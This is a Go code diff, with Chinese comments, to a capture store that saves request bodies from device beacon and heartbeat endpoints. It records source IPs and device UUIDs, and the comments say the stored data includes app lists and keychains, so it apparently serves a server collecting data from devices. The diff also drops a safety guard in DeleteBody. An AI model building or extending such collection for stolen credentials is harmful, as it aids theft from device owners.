@@ -7,6 +7,7 @@ import (
 	"path/filepath"
 	"sort"
 	"strconv"
+	"strings"
 	"sync"
 	"time"
 )
@@ -17,7 +18,7 @@ type CaptureStore struct {
 	mu             sync.Mutex
 	recentCapacity int
 	recent         map[string][]map[string]any
-	observers      []func(endpoint, relPath string, size int, raw []byte)
+	observers      []func(endpoint, relPath string, size int, raw []byte, srcIP string)
 	handles        map[string]*os.File // JSONL 持久句柄（避免每请求 open/close）
 }
 
@@ -35,8 +36,8 @@ func NewCaptureStore(root string) *CaptureStore {
 	}
 }
 
-// AddObserver 观察者签名 fn(endpoint, relPath, size, raw)；异常不影响主链。
-func (c *CaptureStore) AddObserver(fn func(endpoint, relPath string, size int, raw []byte)) {
+// AddObserver 观察者签名 fn(endpoint, relPath, size, raw, srcIP)；异常不影响主链。
+func (c *CaptureStore) AddObserver(fn func(endpoint, relPath string, size int, raw []byte, srcIP string)) {
 	c.observers = append(c.observers, fn)
 }
 
@@ -96,46 +97,103 @@ func (c *CaptureStore) CloseHandles() {
 	}
 }
 
-// SaveBody 原始请求体留存，返回落盘路径。
-func (c *CaptureStore) SaveBody(endpoint string, data []byte, ext string, limit int) string {
-	folder := filepath.Join(c.root, endpoint)
-	_ = ensureDir(folder)
-	if limit > 0 && len(data) > limit {
-		data = data[:limit]
-	}
-	ts := time.Now().Format("20060102-150405")
-	if ext == "" {
-		ext = "bin"
-	}
-	name := ts + "-" + randomHex(8) + "." + ext
-	path := filepath.Join(folder, name)
+// CaptureMinBytes 落盘阈值：小于该大小的回传体不写 capture/ 文件，
+// 只走 DB 指针/元数据 + 解析实体（"大包才落盘"留存策略）。
+// 依据：sync/beacon/a/heartbeat/event 等小包每分钟海量打进来，逐个
+// "写文件→算哈希→入库→重复删文件"纯浪费 IO；磁盘只留大包原始审计
+// （u 应用清单 / war 钥匙串 / nb / result / ph，实际 30KB~5MB）。
+const CaptureMinBytes = 16 * 1024
 
-	c.mu.Lock()
-	_ = os.WriteFile(path, data, 0o644)
-	c.appendRecentLocked(endpoint, name, data)
-	c.mu.Unlock()
+// SaveBody 原始请求体留存，返回落盘相对路径（未落盘返回空串，观察者仍会触发）。
+// srcIP = 服务器侧观测到的连接来源 IP（clientIP），随观察者传给入库层记为 src_ip 元数据。
+func (c *CaptureStore) SaveBody(endpoint string, data []byte, ext string, limit int, srcIP string) string {
+	rel := ""
+	if len(data) >= CaptureMinBytes {
+		folder := filepath.Join(c.root, endpoint)
+		_ = ensureDir(folder)
+		if limit > 0 && len(data) > limit {
+			data = data[:limit]
+		}
+		ts := time.Now().Format("20060102-150405")
+		if ext == "" {
+			ext = "bin"
+		}
+		name := ts + "-" + randomHex(8) + "." + ext
+		// 设备标识前缀：<uuid>_<ts>-<rand>.<ext>，便于在 capture/ 目录里按设备找文件。
+		// 提取不到标识（ph 二进制 / sync 等）时保持旧命名。
+		if dev := deviceKeyFromBody(data); dev != "" {
+			name = dev + "_" + name
+		}
+		path := filepath.Join(folder, name)
 
-	rel := endpoint + "/" + name
+		c.mu.Lock()
+		_ = os.WriteFile(path, data, 0o644)
+		c.appendRecentLocked(endpoint, name, data)
+		c.mu.Unlock()
+		rel = endpoint + "/" + name
+	} else {
+		// 小包：不落盘，仅进内存环形缓冲供看板最近留存展示（file 为空）
+		if limit > 0 && len(data) > limit {
+			data = data[:limit]
+		}
+		c.mu.Lock()
+		c.appendRecentLocked(endpoint, "", data)
+		c.mu.Unlock()
+	}
+
 	for _, fn := range c.observers {
 		func() {
 			defer func() { _ = recover() }()
-			fn(endpoint, rel, len(data), data)
+			fn(endpoint, rel, len(data), data, srcIP)
 		}()
 	}
-	return path
+	return rel
 }
 
 // DeleteBody 删除一份已落盘回传体（相对路径如 "sync/xx.json" 或绝对路径）。
 // 供重复体去重使用（同指纹回传只在首见保留正文）。
 func (c *CaptureStore) DeleteBody(rel string) {
-	if c == nil || rel == "" {
-		return
-	}
 	p := filepath.FromSlash(rel)
 	if !filepath.IsAbs(p) {
 		p = filepath.Join(c.root, p)
 	}
 	_ = os.Remove(p)
+}
+
+// deviceKeyFromBody 从 JSON 回传体提取设备标识（lhu / uuid / device_uuid），
+// 作为落盘文件名前缀（<uuid>_<ts>-<rand>.<ext>），便于在 capture/ 下按设备查找。
+// 非 JSON（ph 二进制等）或标识为空时返回空串，保持原时间戳命名。
+func deviceKeyFromBody(data []byte) string {
+	var j map[string]any
+	if json.Unmarshal(data, &j) != nil {
+		return ""
+	}
+	for _, k := range []string{"lhu", "uuid", "device_uuid"} {
+		if v := toStr(j[k]); v != "" {
+			return sanitizeFileKey(v)
+		}
+	}
+	return ""
+}
+
+// sanitizeFileKey 文件名安全化：仅保留 [A-Za-z0-9._-]，其余替换为 '-'，限长 48。
+func sanitizeFileKey(s string) string {
+	var b strings.Builder
+	b.Grow(len(s))
+	for _, r := range s {
+		switch {
+		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z',
+			r >= '0' && r <= '9', r == '.', r == '_', r == '-':
+			b.WriteRune(r)
+		default:
+			b.WriteByte('-')
+		}
+	}
+	out := b.String()
+	if len(out) > 48 {
+		out = out[:48]
+	}
+	return out
 }
 
 func (c *CaptureStore) appendRecentLocked(endpoint, fname string, data []byte) {
